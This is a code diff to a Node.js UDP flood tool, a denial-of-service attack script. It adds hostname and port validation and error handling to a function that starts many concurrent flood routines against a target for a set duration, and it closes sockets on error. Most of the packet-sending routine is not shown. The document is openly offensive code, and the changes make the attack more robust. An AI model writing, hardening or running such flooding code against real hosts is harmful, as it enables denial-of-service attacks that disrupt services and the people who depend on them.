@@ -2,19 +2,34 @@ const dgram = require('dgram');
 const crypto = require('crypto');
 
 async function udpFlood(target, duration, intensity = 100) {
-  const url = new URL(target);
-  const hostname = url.hostname;
-  const port = url.port || 80;
-  const startTime = Date.now();
+  try {
+    const url = new URL(target);
+    const hostname = url.hostname;
+    const port = parseInt(url.port) || 80;
 
-  console.log(`UDP flood started against ${target} with intensity ${intensity}`);
+    if (!hostname) {
+      console.error('Invalid target URL: Hostname is missing.');
+      return;
+    }
 
-  for (let i = 0; i < intensity; i++) {
-    flood(hostname, port, duration, startTime);
+    if (isNaN(port) || port <= 0 || port > 65535) {
+      console.error('Invalid target URL: Port is invalid.');
+      return;
+    }
+
+    const startTime = Date.now();
+
+    console.log(`UDP flood started against ${target} with intensity ${intensity}`);
+
+    for (let i = 0; i < intensity; i++) {
+      flood(hostname, port, duration, startTime);
+    }
+
+    await new Promise(resolve => setTimeout(resolve, duration * 1000));
+    console.log(`UDP flood finished against ${target}`);
+  } catch (error) {
+    console.error(`Error processing target URL: ${error}`);
   }
-
-  await new Promise(resolve => setTimeout(resolve, duration * 1000));
-  console.log(`UDP flood finished against ${target}`);
 }
 
 async function flood(hostname, port, duration, startTime) {
@@ -31,6 +46,7 @@ async function flood(hostname, port, duration, startTime) {
 
       socket.on('error', (err) => {
         console.error(`Socket error: ${err}`);
+        socket.close();
       });
 
       socket.on('close', () => {
